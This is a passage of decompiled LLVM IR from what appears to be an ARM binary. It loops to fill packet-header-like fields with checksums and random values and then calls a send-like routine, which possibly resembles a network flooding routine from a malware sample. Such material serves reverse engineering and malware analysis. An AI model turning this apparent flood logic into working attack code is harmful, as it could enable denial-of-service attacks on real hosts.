  %v2_9750 = load i32, i32* @r6, align 4
  %v3_9750 = add i32 %v2_9750, 2
  %v4_9750 = inttoptr i32 %v3_9750 to i16*
  store i16 %v1_9750, i16* %v4_9750, align 2
  %v0_9754 = load i32, i32* @r4, align 4
  store i32 %v0_9754, i32* %stack_var_-44, align 4
  %v5_9758 = icmp slt i32 %v1_973c, %v1_9744
  br i1 %v5_9758, label %dec_label_pc_9600, label %dec_label_pc_975c

dec_label_pc_975c:                                ; preds = %bb85
  %v1_9764 = add i32 %v5_9480, 8
  store i32 %v1_9764, i32* %r4.global-to-local, align 4
  %v1_9768 = add i32 %v5_9480, 66
  store i32 %v1_9768, i32* %r5.global-to-local, align 4
  %v0_9778.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9774.preheader

dec_label_pc_9774.preheader:                      ; preds = %dec_label_pc_975c, %dec_label_pc_9a0c
  %v0_9778.pre = phi i32 [ %v0_9778.pre.pre, %dec_label_pc_975c ], [ 0, %dec_label_pc_9a0c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_9768, %dec_label_pc_975c ], [ %v1_9a18, %dec_label_pc_9a0c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_9764, %dec_label_pc_975c ], [ %v1_9a14, %dec_label_pc_9a0c ]
  %v2_99c8 = icmp eq i32 %v1_952c, 0
  %v2_9810 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9828 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9838 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9844 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9858 = icmp eq i32 %v1_94a0, 0
  %v2_97b8 = icmp eq i32 %v5_94d4, -1
  %v7_97b8 = icmp eq i32 %v5_94d4, -1
  br label %dec_label_pc_9774

dec_label_pc_9774:                                ; preds = %dec_label_pc_9774, %dec_label_pc_9860, %dec_label_pc_9774.preheader
  %v0_9778 = phi i32 [ %v0_9778.pre, %dec_label_pc_9774.preheader ], [ 0, %dec_label_pc_9774 ], [ %v1_98fc, %dec_label_pc_9860 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9778 = icmp eq i32 %v0_9778, 0
  store i1 %v2_9778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9778, label %dec_label_pc_9774, label %dec_label_pc_9784

dec_label_pc_9784:                                ; preds = %dec_label_pc_9774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9788

dec_label_pc_9788:                                ; preds = %dec_label_pc_9860, %dec_label_pc_9784
  %v1_979c = phi i32 [ %v1_98f8, %dec_label_pc_9860 ], [ 0, %dec_label_pc_9784 ]
  %v5_978c = mul i32 %v1_979c, 24
  %v1_9790 = load i32, i32* @sb, align 4
  %v2_9790 = add i32 %v1_9790, %v5_978c
  store i32 %v2_9790, i32* %r3.global-to-local, align 4
  store i32 %v2_93b4, i32* %r4.global-to-local, align 4
  %v1_9798 = add i32 %v2_9790, 20
  %v2_9798 = inttoptr i32 %v1_9798 to i8*
  %v3_9798 = load i8, i8* %v2_9798, align 1
  %v4_9798 = zext i8 %v3_9798 to i32
  store i32 %v4_9798, i32* %r2.global-to-local, align 4
  %v4_979c = mul i32 %v1_979c, 4
  %v5_979c = add i32 %v4_979c, %v2_93b4
  %v6_979c = inttoptr i32 %v5_979c to i32*
  %v7_979c = load i32, i32* %v6_979c, align 4
  store i32 %v7_979c, i32* @r5, align 4
  %v7_97a0 = icmp eq i8 %v3_9798, 31
  store i1 %v7_97a0, i1* %cpsr_z.global-to-local, align 1
  %v1_97a4 = add i32 %v7_979c, 24
  store i32 %v1_97a4, i32* @r7, align 4
  %v1_97a8 = add i32 %v7_979c, 38
  store i32 %v1_97a8, i32* @r6, align 4
  %v1_97ac = add i32 %v7_979c, 58
  store i32 %v1_97ac, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_9798, 32
  br i1 %tmp90, label %dec_label_pc_990c, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9788
  store i32 %v5_94d4, i32* %r1.global-to-local, align 4
  store i1 %v7_97b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97b8, label %dec_label_pc_996c, label %dec_label_pc_97c0

dec_label_pc_97c0:                                ; preds = %dec_label_pc_990c, %dec_label_pc_97b4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_97c8 = load i32, i32* @fp, align 4
  %v9_97c8 = icmp eq i32 %v0_97c8, 65535
  store i1 %v9_97c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97c8, label %dec_label_pc_9984, label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_996c.dec_label_pc_97d0_crit_edge, %dec_label_pc_97c0
  %v1_97d4 = phi i32 [ %v1_97d4.pre, %dec_label_pc_996c.dec_label_pc_97d0_crit_edge ], [ 65535, %dec_label_pc_97c0 ]
  store i32 %v3_9534, i32* %r2.global-to-local, align 4
  %v9_97d4 = icmp eq i32 %v3_9534, %v1_97d4
  store i1 %v9_97d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97d4, label %dec_label_pc_99ac, label %dec_label_pc_97dc

dec_label_pc_97dc:                                ; preds = %dec_label_pc_9984.dec_label_pc_97dc_crit_edge, %dec_label_pc_97d0
  %v1_97e0 = phi i32 [ %v1_97e0.pre, %dec_label_pc_9984.dec_label_pc_97dc_crit_edge ], [ %v1_97d4, %dec_label_pc_97d0 ]
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v9_97e0 = icmp eq i32 %v3_9538, %v1_97e0
  store i1 %v9_97e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97e0, label %dec_label_pc_99c0, label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_97dc
  store i32 %v1_952c, i32* @r4, align 4
  store i1 %v2_99c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99c8, label %dec_label_pc_99dc, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_97e8
  %v1_97f0 = load i32, i32* @r5, align 4
  %v2_97f0 = add i32 %v1_97f0, 16
  %v3_97f0 = inttoptr i32 %v2_97f0 to i32*
  %v4_97f0 = load i32, i32* %v3_97f0, align 4
  store i32 %v4_97f0, i32* %r3.global-to-local, align 4
  %v2_97f4 = load i32, i32* @r6, align 4
  %v3_97f4 = add i32 %v2_97f4, 16
  %v4_97f4 = inttoptr i32 %v3_97f4 to i32*
  store i32 %v4_97f0, i32* %v4_97f4, align 4
  br label %dec_label_pc_97fc

dec_label_pc_97fc:                                ; preds = %bb88, %.thread11, %dec_label_pc_99dc
  %v0_97fc = call i32 @function_e094()
  store i32 %v0_97fc, i32* %r0.global-to-local, align 4
  store i32 %v0_97fc, i32* %stack_var_-48, align 4
  %v0_9804 = call i32 @function_e094()
  store i32 %v0_9804, i32* %r0.global-to-local, align 4
  store i32 %v0_9804, i32* %stack_var_-52, align 4
  %v0_980c = call i32 @function_e094()
  store i32 %v2_9810, i32* %r1.global-to-local, align 4
  store i32 %v0_980c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_981c = load i32, i32* @r7, align 4
  store i32 %v0_981c, i32* %r0.global-to-local, align 4
  %v3_9820 = call i32 @function_10190(i32 %v0_981c, i32 %v2_9810, i32 4)
  %v0_9824 = load i32, i32* @r7, align 4
  %v1_9824 = add i32 %v0_9824, 6
  store i32 %v1_9824, i32* %r0.global-to-local, align 4
  store i32 %v2_9828, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9830 = call i32 @function_10190(i32 %v1_9824, i32 %v2_9828, i32 4)
  %v0_9834 = load i32, i32* @r7, align 4
  %v1_9834 = add i32 %v0_9834, 4
  store i32 %v1_9834, i32* %r0.global-to-local, align 4
  store i32 %v2_9838, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9840 = call i32 @function_10190(i32 %v1_9834, i32 %v2_9838, i32 2)
  store i32 %v2_9844, i32* %r1.global-to-local, align 4
  %v0_9848 = load i32, i32* @r7, align 4
  %v1_9848 = add i32 %v0_9848, 10
  store i32 %v1_9848, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9850 = call i32 @function_10190(i32 %v1_9848, i32 %v2_9844, i32 2)
  store i32 %v3_9850, i32* %r0.global-to-local, align 4
  store i32 %v1_94a0, i32* %r1.global-to-local, align 4
  store i1 %v2_9858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9858, label %dec_label_pc_9860, label %dec_label_pc_99e8

dec_label_pc_9860:                                ; preds = %dec_label_pc_97fc, %dec_label_pc_99e8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9864 = load i32, i32* @r5, align 4
  %v3_9864 = add i32 %v2_9864, 10
  %v4_9864 = inttoptr i32 %v3_9864 to i16*
  store i16 0, i16* %v4_9864, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_986c = load i32, i32* @r5, align 4
  store i32 %v0_986c, i32* @r0, align 4
  %v2_9870 = call i32 @function_c848(i32 %v0_986c, i32 20)
  %v3_9870 = trunc i32 %v2_9870 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9878 = load i32, i32* @r5, align 4
  %v4_9878 = add i32 %v3_9878, 10
  %v5_9878 = inttoptr i32 %v4_9878 to i16*
  store i16 %v3_9870, i16* %v5_9878, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9880 = load i32, i32* %r3.global-to-local, align 4
  %v1_9880 = trunc i32 %v0_9880 to i16
  %v2_9880 = load i32, i32* @r6, align 4
  %v3_9880 = add i32 %v2_9880, 10
  %v4_9880 = inttoptr i32 %v3_9880 to i16*
  store i16 %v1_9880, i16* %v4_9880, align 2
  %v0_9884 = load i32, i32* @r6, align 4
  store i32 %v0_9884, i32* @r0, align 4
  %v2_9888 = call i32 @function_c848(i32 %v0_9884, i32 20)
  %v3_9888 = trunc i32 %v2_9888 to i16
  store i32 %v2_9888, i32* %r0.global-to-local, align 4
  %v3_988c = load i32, i32* @r6, align 4
  %v4_988c = add i32 %v3_988c, 10
  %v5_988c = inttoptr i32 %v4_988c to i16*
  store i16 %v3_9888, i16* %v5_988c, align 2
  store i32 0, i32* @r4, align 4
  %v0_9894 = load i32, i32* @r8, align 4
  store i32 %v0_9894, i32* @r1, align 4
  %v1_9898 = add i32 %v0_9894, 4
  %v2_9898 = inttoptr i32 %v1_9898 to i16*
  %v3_9898 = load i16, i16* %v2_9898, align 2
  %v4_9898 = zext i16 %v3_9898 to i32
  store i32 %v4_9898, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98a0 = add i32 %v0_9894, 6
  %v4_98a0 = inttoptr i32 %v3_98a0 to i16*
  store i16 0, i16* %v4_98a0, align 2
  %v0_98a4 = load i32, i32* @r6, align 4
  store i32 %v0_98a4, i32* %r0.global-to-local, align 4
  %v4_98a8 = call i32 @function_c898(i32 %v0_98a4, i32 %v0_9894, i32 %v4_9898, i32 %stack_var_-136.0.ph)
  %v5_98a8 = trunc i32 %v4_98a8 to i16
  store i32 %v4_98a8, i32* %r0.global-to-local, align 4
  %v3_98ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ac, i32* %r2.global-to-local, align 4
  %v3_98b0 = mul i32 %v3_98ac, 32
  store i32 %v3_98b0, i32* %r3.global-to-local, align 4
  %v0_98b4 = load i32, i32* @r5, align 4
  %v1_98b4 = add i32 %v0_98b4, 16
  %v2_98b4 = inttoptr i32 %v1_98b4 to i32*
  %v3_98b4 = load i32, i32* %v2_98b4, align 4
  %v5_98b8 = mul i32 %v3_98ac, 24
  store i32 %v5_98b8, i32* %r3.global-to-local, align 4
  %v1_98bc = load i32, i32* @sb, align 4
  %v2_98bc = add i32 %v1_98bc, %v5_98b8
  store i32 %v2_98bc, i32* @lr, align 4
  %v2_98c0 = add i32 %v2_98bc, 4
  %v3_98c0 = inttoptr i32 %v2_98c0 to i32*
  store i32 %v3_98b4, i32* %v3_98c0, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_98c8 = load i32, i32* @r8, align 4
  %v4_98c8 = add i32 %v3_98c8, 6
  %v5_98c8 = inttoptr i32 %v4_98c8 to i16*
  store i16 %v5_98a8, i16* %v5_98c8, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_98d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_98d0 = trunc i32 %v0_98d0 to i16
  %v2_98d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_98d0 = load i32, i32* @sb, align 4
  %v4_98d0 = add i32 %v3_98d0, %v2_98d0
  %v5_98d0 = inttoptr i32 %v4_98d0 to i16*
  store i16 %v1_98d0, i16* %v5_98d0, align 2
  %v0_98d4 = load i32, i32* @r4, align 4
  %v1_98d4 = trunc i32 %v0_98d4 to i16
  %v2_98d4 = load i32, i32* @lr, align 4
  %v3_98d4 = add i32 %v2_98d4, 2
  %v4_98d4 = inttoptr i32 %v3_98d4 to i16*
  store i16 %v1_98d4, i16* %v4_98d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_98dc = load i32, i32* @r5, align 4
  store i32 %v0_98dc, i32* %r1.global-to-local, align 4
  store i32 %v3_94e8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_98e8 = load i32, i32* @lr, align 4
  %v0_98ec = load i32, i32* %ip.global-to-local, align 4
  %v6_98f0 = call i32 @function_11338(i32 %v3_94e8, i32 %v0_98dc, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_98e8, i32 %v0_98ec)
  %v3_98f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98f4, i32* %r3.global-to-local, align 4
  %v1_98f8 = add i32 %v3_98f4, 1
  store i32 %v1_98f8, i32* %r0.global-to-local, align 4
  %v1_98fc = load i32, i32* @sl, align 4
  %v9_98fc = icmp eq i32 %v1_98f8, %v1_98fc
  store i1 %v9_98fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_98f8, i32* %stack_var_-44, align 4
  %v6_9904 = icmp slt i32 %v1_98f8, %v1_98fc
  br i1 %v6_9904, label %dec_label_pc_9788, label %dec_label_pc_9774

dec_label_pc_990c:                                ; preds = %dec_label_pc_9788
  %v1_990c = add i32 %v2_9790, 16
  %v2_990c = inttoptr i32 %v1_990c to i32*
  %v3_990c = load i32, i32* %v2_990c, align 4
  store i32 %v3_990c, i32* %r4.global-to-local, align 4
  %v0_9910 = call i32 @function_e094()
  store i32 %v0_9910, i32* %r0.global-to-local, align 4
  %v3_9914 = load i32, i32* %stack_var_-44, align 4
  %v5_991c = mul i32 %v3_9914, 24
  %v0_9920 = load i32, i32* %r4.global-to-local, align 4
  %v1_9920 = and i32 %v0_9920, 16711680
  store i32 %v1_9920, i32* %ip.global-to-local, align 4
  %v3_9924 = udiv i32 %v0_9920, 16777216
  %v4_9928 = udiv i32 %v1_9920, 256
  %v5_9928 = or i32 %v4_9928, %v3_9924
  store i32 %v5_9928, i32* %r2.global-to-local, align 4
  %v1_992c = load i32, i32* @sb, align 4
  %v2_992c = add i32 %v1_992c, %v5_991c
  store i32 %v2_992c, i32* %r1.global-to-local, align 4
  %v1_9930 = and i32 %v0_9920, 65280
  store i32 %v1_9930, i32* %r3.global-to-local, align 4
  %v1_9934 = add i32 %v2_992c, 20
  %v2_9934 = inttoptr i32 %v1_9934 to i8*
  %v3_9934 = load i8, i8* %v2_9934, align 1
  %v4_9934 = zext i8 %v3_9934 to i32
  store i32 %v4_9934, i32* %ip.global-to-local, align 4
  %v5_993c = call i32 @llvm.bswap.i32(i32 %v0_9920)
  %v7_9940 = lshr i32 %v0_9910, %v4_9934
  %v8_9940 = add i32 %v7_9940, %v5_993c
  store i32 %v8_9940, i32* %r2.global-to-local, align 4
  %v1_9944 = and i32 %v8_9940, 16711680
  store i32 %v1_9944, i32* %r0.global-to-local, align 4
  store i32 %v5_94d4, i32* %r1.global-to-local, align 4
  %v5_995c = call i32 @llvm.bswap.i32(i32 %v8_9940)
  store i32 %v5_995c, i32* %r3.global-to-local, align 4
  store i1 %v7_97b8, i1* %cpsr_z.global-to-local, align 1
  %v1_9964 = load i32, i32* @r5, align 4
  %v2_9964 = add i32 %v1_9964, 16
  %v3_9964 = inttoptr i32 %v2_9964 to i32*
  store i32 %v5_995c, i32* %v3_9964, align 4
  br i1 %v2_97b8, label %dec_label_pc_996c, label %dec_label_pc_97c0

dec_label_pc_996c:                                ; preds = %dec_label_pc_990c, %dec_label_pc_97b4
  %v0_996c = call i32 @function_e094()
  store i32 %v0_996c, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9978 = load i32, i32* @fp, align 4
  %v9_9978 = icmp eq i32 %v0_9978, 65535
  store i1 %v9_9978, i1* %cpsr_z.global-to-local, align 1
  %v1_997c = load i32, i32* @r5, align 4
  %v2_997c = add i32 %v1_997c, 12
  %v3_997c = inttoptr i32 %v2_997c to i32*
  store i32 %v0_996c, i32* %v3_997c, align 4
  br i1 %v9_9978, label %dec_label_pc_9984, label %dec_label_pc_996c.dec_label_pc_97d0_crit_edge

dec_label_pc_996c.dec_label_pc_97d0_crit_edge:    ; preds = %dec_label_pc_996c
  %v1_97d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_97d0

dec_label_pc_9984:                                ; preds = %dec_label_pc_996c, %dec_label_pc_97c0
  %v0_9984 = call i32 @function_e094()
  %v3_998c = urem i32 %v0_9984, 65536
  store i32 %v3_998c, i32* %r0.global-to-local, align 4
  store i32 %v3_9534, i32* %r2.global-to-local, align 4
  %v1_9998 = sub nsw i32 999, %v3_998c
  store i32 %v1_9998, i32* %r3.global-to-local, align 4
  %v1_999c = load i32, i32* %r4.global-to-local, align 4
  %v9_999c = icmp eq i32 %v3_9534, %v1_999c
  store i1 %v9_999c, i1* %cpsr_z.global-to-local, align 1
  %v1_99a0 = trunc i32 %v0_9984 to i16
  %v2_99a0 = load i32, i32* @r5, align 4
  %v3_99a0 = add i32 %v2_99a0, 4
  %v4_99a0 = inttoptr i32 %v3_99a0 to i16*
  store i16 %v1_99a0, i16* %v4_99a0, align 2
  %v0_99a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99a4 = trunc i32 %v0_99a4 to i16
  %v2_99a4 = load i32, i32* @r6, align 4
  %v3_99a4 = add i32 %v2_99a4, 4
  %v4_99a4 = inttoptr i32 %v3_99a4 to i16*
  store i16 %v1_99a4, i16* %v4_99a4, align 2
  br i1 %v9_999c, label %dec_label_pc_99ac, label %dec_label_pc_9984.dec_label_pc_97dc_crit_edge

dec_label_pc_9984.dec_label_pc_97dc_crit_edge:    ; preds = %dec_label_pc_9984
  %v1_97e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_97dc

dec_label_pc_99ac:                                ; preds = %dec_label_pc_9984, %dec_label_pc_97d0
  %v0_99ac = call i32 @function_e094()
  %v1_99ac = trunc i32 %v0_99ac to i16
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v1_99b4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99b4 = icmp eq i32 %v3_9538, %v1_99b4
  store i1 %v9_99b4, i1* %cpsr_z.global-to-local, align 1
  %v3_99b8 = load i32, i32* @r5, align 4
  %v4_99b8 = add i32 %v3_99b8, 58
  %v5_99b8 = inttoptr i32 %v4_99b8 to i16*
  store i16 %v1_99ac, i16* %v5_99b8, align 2
  br i1 %v9_99b4, label %dec_label_pc_99c0, label %dec_label_pc_97e8

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_97dc
  %v0_99c0 = call i32 @function_e094()
  %v1_99c0 = trunc i32 %v0_99c0 to i16
  store i32 %v0_99c0, i32* %r0.global-to-local, align 4
  store i32 %v1_952c, i32* @r4, align 4
  store i1 %v2_99c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99c8, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_99c0
  %v3_99d032 = load i32, i32* @r8, align 4
  %v4_99d033 = add i32 %v3_99d032, 2
  %v5_99d034 = inttoptr i32 %v4_99d033 to i16*
  store i16 %v1_99c0, i16* %v5_99d034, align 2
  br label %dec_label_pc_99dc

bb88:                                             ; preds = %dec_label_pc_99c0
  %v1_99cc = load i32, i32* @r5, align 4
  %v2_99cc = add i32 %v1_99cc, 16
  %v3_99cc = inttoptr i32 %v2_99cc to i32*
  %v4_99cc = load i32, i32* %v3_99cc, align 4
  store i32 %v4_99cc, i32* %r3.global-to-local, align 4
  %v3_99d0 = load i32, i32* @r8, align 4
  %v4_99d0 = add i32 %v3_99d0, 2
  %v5_99d0 = inttoptr i32 %v4_99d0 to i16*
  store i16 %v1_99c0, i16* %v5_99d0, align 2
  %v1_99d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_99d4 = load i32, i32* @r6, align 4
  %v3_99d4 = add i32 %v2_99d4, 16
  %v4_99d4 = inttoptr i32 %v3_99d4 to i32*
  store i32 %v1_99d4, i32* %v4_99d4, align 4
  br label %dec_label_pc_97fc

dec_label_pc_99dc:                                ; preds = %.thread31, %dec_label_pc_97e8
  %v0_99dc = call i32 @function_e094()
  store i32 %v0_99dc, i32* %r0.global-to-local, align 4
  %v1_99e0 = load i32, i32* @r6, align 4
  %v2_99e0 = add i32 %v1_99e0, 16
  %v3_99e0 = inttoptr i32 %v2_99e0 to i32*
  store i32 %v0_99dc, i32* %v3_99e0, align 4
  br label %dec_label_pc_97fc

dec_label_pc_99e8:                                ; preds = %dec_label_pc_97fc
  %v0_99e8 = load i32, i32* @r8, align 4
  %v1_99e8 = add i32 %v0_99e8, 8
  store i32 %v1_99e8, i32* %r0.global-to-local, align 4
  store i32 %v5_9480, i32* %r1.global-to-local, align 4
  %v2_99f0 = inttoptr i32 %v1_99e8 to i16*
  %v3_99f0 = call i32 @function_e228(i16* %v2_99f0, i32 %v5_9480)
  store i32 %v3_99f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9860

dec_label_pc_99f8:                                ; preds = %dec_label_pc_94f8
  store i32 %v3_94e8, i32* %r0.global-to-local, align 4
  %v1_99fc = call i32 @function_10be0(i32 %v3_94e8)
  store i32 %v1_99fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a00

dec_label_pc_9a00:                                ; preds = %dec_label_pc_9398, %dec_label_pc_99f8
  %v1_9a08 = phi i32 [ %v3_94e8, %dec_label_pc_9398 ], [ %v1_99fc, %dec_label_pc_99f8 ]
  store i32 %v3_9398, i32* %r4.global-to-local, align 4
  store i32 %v6_9398, i32* %r5.global-to-local, align 4
  store i32 %v24_9398, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a08

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_9520
  %v1_9a14 = add i32 %v5_9480, 8
  store i32 %v1_9a14, i32* %r1.global-to-local, align 4
  %v1_9a18 = add i32 %v5_9480, 66
  store i32 %v1_9a18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9774.preheader

; uselistorder directives
  uselistorder i32 %v1_9a18, { 1, 0 }
  uselistorder i32 %v1_9a14, { 1, 0 }
  uselistorder i16 %v1_99c0, { 1, 0 }
  uselistorder i32 %v0_99c0, { 1, 0 }
  uselistorder i32 %v0_99ac, { 1, 0 }
  uselistorder i32 %v3_998c, { 1, 0 }
  uselistorder i32 %v0_9984, { 1, 0 }
  uselistorder i32 %v5_995c, { 1, 0 }
  uselistorder i32 %v0_9920, { 1, 2, 0, 3 }
  uselistorder i32 %v1_98fc, { 1, 2, 0 }
  uselistorder i32 %v1_98f8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ac, { 1, 0, 2 }
  uselistorder i32 %v4_98a8, { 1, 0 }
  uselistorder i32 %v0_9894, { 1, 0, 2, 3 }
  uselistorder i32 %v2_9888, { 1, 0 }
  uselistorder i32 %v7_979c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97b8, { 2, 1, 0 }
  uselistorder i1 %v2_99c8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_970c, { 1, 0, 2 }
  uselistorder i32 %v3_9588, { 1, 0 }
  uselistorder i32 %v3_956c, { 1, 2, 0 }
  uselistorder i32 %v1_9568, { 1, 0 }
  uselistorder i32 %v1_952c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9528, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9524, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9520, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9518, { 1, 0 }
  uselistorder i1 %v7_94ec, { 1, 0 }
  uselistorder i32 %v3_94e8, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_94d4, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94a0, { 1, 2, 0 }
  uselistorder i32 %v5_9480, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9434, { 1, 0 }
  uselistorder i32 %v1_9410, { 2, 1, 0 }
  uselistorder i32 %v5_9408, { 1, 0 }
  uselistorder i8 %v5_93ec, { 0, 2, 1 }
  uselistorder i32 %v6_93cc, { 1, 0 }
  uselistorder i32 %v2_93b4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a00, { 1, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_97fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9774, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9774.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @function_9a2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a2c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a2c = load i32, i32* @r4, align 4
  %v6_9a2c = load i32, i32* @r5, align 4
  %v24_9a2c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_9a48 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_9a4c = load i32, i32* @r5, align 4
  store i32 %v0_9a4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a5c = load i32, i32* @r4, align 4
  %v5_9a60 = inttoptr i32 %v0_9a4c to i32*
  %v6_9a60 = call i32 @function_8570(i32 %v0_9a5c, i32* %v5_9a60, i32 2, i32 0)
  %v1_9a6c = urem i32 %v6_9a60, 256
  store i32 %v1_9a6c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9a78 = load i32, i32* @r5, align 4
  store i32 %v0_9a78, i32* %r1.global-to-local, align 4
  %v0_9a7c = load i32, i32* @r4, align 4
  %v5_9a80 = trunc i32 %v6_9a60 to i8
  %v6_9a84 = inttoptr i32 %v0_9a78 to i32*
  %v7_9a84 = call i32 @function_8570(i32 %v0_9a7c, i32* %v6_9a84, i32 3, i32 65535)
  %v0_9a88 = load i32, i32* @r5, align 4
